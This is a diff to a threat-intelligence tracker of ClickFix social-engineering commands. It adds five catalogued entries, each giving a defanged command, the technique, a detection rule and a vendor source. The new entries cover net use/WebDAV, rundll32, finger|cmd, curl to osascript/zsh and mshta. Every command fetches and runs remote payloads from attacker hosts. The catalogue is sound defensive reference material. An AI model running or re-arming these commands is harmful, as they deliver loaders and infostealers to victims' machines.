@@ -7,8 +7,8 @@ ClickFix is a social-engineering technique where a victim is tricked (fake CAPTC
 check, browser or document "error") into pasting and running an attacker-supplied command in the
 Windows **Run** dialog, PowerShell or a terminal. The payload runs with the user's own permissions.
 
-- **Entries:** 24
-- **Last updated:** 2026-08-27
+- **Entries:** 29
+- **Last updated:** 2026-08-29
 - **Maintained by:** PAI ClickFix Tracker (daily) · source: [Sergio-Albea-Git/Threat-Hunting-KQL-Queries](https://github.com/Sergio-Albea-Git/Threat-Hunting-KQL-Queries)
 
 ## Commands
@@ -39,6 +39,11 @@ Windows **Run** dialog, PowerShell or a terminal. The payload runs with the user
 | cf-0022 | `mshta.exe` | Fake-CAPTCHA ClickFix pastes an mshta one-liner that pulls remote HTA/script content from a hex-octal-obfuscated IP literal (0x5a) with a non-.hta extension (.gz/.odd/.dat); leads to .NET loader that extracts shellcode hidden via steganography in a PNG. | Huntress |
 | cf-0023 | `cmd.exe` | Fake-CAPTCHA ClickFix pastes a cmd one-liner that curls an attacker host whose URL path impersonates a trusted CDN (amazoncdn / cdn-dynmedia-1.microsoft.com) and pipes the response straight into powershell (no file drop, no iex); observed dropping Latrodectus and Supper. | CERT Polska |
 | cf-0024 | `osascript` | macOS ClickFix 'fake utility' lure offers a one-click copy of an obfuscated curl one-liner that pipes a remotely fetched AppleScript directly into osascript (sibling variants pipe to zsh with base64+gzip+eval), bypassing Gatekeeper by never writing an app bundle; delivers infostealers with a t.me Telegram C2 fallback. | Microsoft Threat Intelligence |
+| cf-0025 | `cmd.exe` | ClickFix pastes a cmd one-liner that mounts an attacker WebDAV server as drive Z:, runs a staged update.cmd loader, then unmaps the drive to clean up. | Atos Threat Research (via The Hacker News) |
+| cf-0026 | `rundll32.exe` | ClickFix loads a remote 32-bit DLL over the WebDAV mini-redirector using a UNC path with the @80 HTTP port qualifier and calls export ordinal #1 (SkimokKeep loader), avoiding PowerShell entirely. | CyberProof |
+| cf-0027 | `finger.exe` | Fake-CAPTCHA ClickFix uses the legacy finger.exe LOLBin to retrieve an attacker-hosted script over TCP/79 and pipes the response straight into cmd for execution (KongTuke and SmartApeSG campaigns). | SANS Internet Storm Center (Johannes Ullrich) |
+| cf-0028 | `osascript (Script Editor via applescript:// scheme)` | macOS ClickFix uses an applescript:// URL to open Script Editor with a tr-obfuscated AppleScript that runs curl -kSsfL to fetch a gzip stager piped into zsh, ending in Atomic Stealer (AMOS). | Jamf Threat Labs |
+| cf-0029 | `mshta.exe` | Fake 'Windows Update' ClickFix lure runs mshta against a hex-encoded-second-octet IP serving JScript from a non-.hta extension (.odd/.dat), which stages a PowerShell .NET steganographic loader hiding shellcode in PNG pixels (LummaC2/Rhadamanthys). | Huntress |
 
 ### cf-0001 — `powershell.exe`
 
@@ -303,6 +308,61 @@ curl -s hxxps://honestly[.]ink/<id> | osascript
 - **Detection:** On macOS, alert when Terminal/osascript or zsh is the child of a curl|pipe execution fetching a remote script; inspect shell history and Unified Log for 'curl … | osascript' and lookups to honestly[.]ink / 0x666[.]info.
 - **Source:** Microsoft Threat Intelligence — hxxps://www[.]microsoft[.]com/en-us/security/blog/2026/05/06/clickfix-campaign-uses-fake-macos-utilities-lures-deliver-infostealers/
 - **Added:** 2026-05-06
+
+### cf-0025 — `cmd.exe`
+
+```text
+"cmd.exe" /c net use Z: hxxps://94[.]156[.]170[.]255/webdav /persistent:no && "Z:\update.cmd" & net use Z: /delete
+```
+
+- **Technique:** ClickFix pastes a cmd one-liner that mounts an attacker WebDAV server as drive Z:, runs a staged update.cmd loader, then unmaps the drive to clean up.
+- **Detection:** Alert on cmd.exe 'net use' mapping a drive letter to a raw-IP HTTPS/WebDAV path, immediately followed by execution of a .cmd/.bat from that mapped drive.
+- **Source:** Atos Threat Research (via The Hacker News) — hxxps://thehackernews[.]com/2026/03/investigating-new-click-fix-variant.html
+- **Added:** 2026-03-13
+
+### cf-0026 — `rundll32.exe`
+
+```text
+rundll32.exe \\data-x7-sync.neurosync[.]in[.]net@80\verification.google,#1
+```
+
+- **Technique:** ClickFix loads a remote 32-bit DLL over the WebDAV mini-redirector using a UNC path with the @80 HTTP port qualifier and calls export ordinal #1 (SkimokKeep loader), avoiding PowerShell entirely.
+- **Detection:** Hunt for rundll32.exe with a UNC/WebDAV path containing '@80' or '@443'/'@SSL' and an ordinal export (',#1'); pair with new WebClient service starts and outbound WebDAV traffic.
+- **Source:** CyberProof — hxxps://www[.]cyberproof[.]com/blog/the-clickfix-evolution-new-variant-replaces-powershell-with-rundll32-and-webdav/
+- **Added:** 2026-03-19
+
+### cf-0027 — `finger.exe`
+
+```text
+finger gcaptcha@captchaver[.]top | cmd
+```
+
+- **Technique:** Fake-CAPTCHA ClickFix uses the legacy finger.exe LOLBin to retrieve an attacker-hosted script over TCP/79 and pipes the response straight into cmd for execution (KongTuke and SmartApeSG campaigns).
+- **Detection:** Flag any finger.exe execution (rare on modern hosts), especially outbound TCP/79 to non-corporate hosts and finger.exe spawning cmd.exe or powershell.exe as a child.
+- **Source:** SANS Internet Storm Center (Johannes Ullrich) — hxxps://isc[.]sans[.]edu/diary/32566
+- **Added:** 2025-12-13
+
+### cf-0028 — `osascript (Script Editor via applescript:// scheme)`
+
+```text
+curl -kSsfL hxxps://dryvecar[.]com/curl/04566d1d3f9717b2e7e6b643775d9ca72cef942f6df9ce075cf8c73a1bd2565a
+```
+
+- **Technique:** macOS ClickFix uses an applescript:// URL to open Script Editor with a tr-obfuscated AppleScript that runs curl -kSsfL to fetch a gzip stager piped into zsh, ending in Atomic Stealer (AMOS).
+- **Detection:** Correlate Script Editor / osascript launching curl with -kSsfL to a '/curl/<hex>' path, followed by base64/gzip decode piped to zsh and xattr -c on a /tmp Mach-O.
+- **Source:** Jamf Threat Labs — hxxps://www[.]jamf[.]com/blog/clickfix-macos-script-editor-atomic-stealer/
+- **Added:** 2026-04-08
+
+### cf-0029 — `mshta.exe`
+
+```text
+mshta hxxp://141[.]0x62[.]80[.]175/tick.odd
+```
+
+- **Technique:** Fake 'Windows Update' ClickFix lure runs mshta against a hex-encoded-second-octet IP serving JScript from a non-.hta extension (.odd/.dat), which stages a PowerShell .NET steganographic loader hiding shellcode in PNG pixels (LummaC2/Rhadamanthys).
+- **Detection:** Hunt mshta.exe fetching URLs with hex-octet IPs (e.g. 0x62) and non-HTML extensions like .odd/.dat, then mshta spawning powershell.exe with in-memory download activity.
+- **Source:** Huntress — hxxps://www[.]huntress[.]com/blog/clickfix-malware-buried-in-images
+- **Added:** 2025-11-24
 
 ## Threat Hunting (KQL — Microsoft Defender XDR)
 
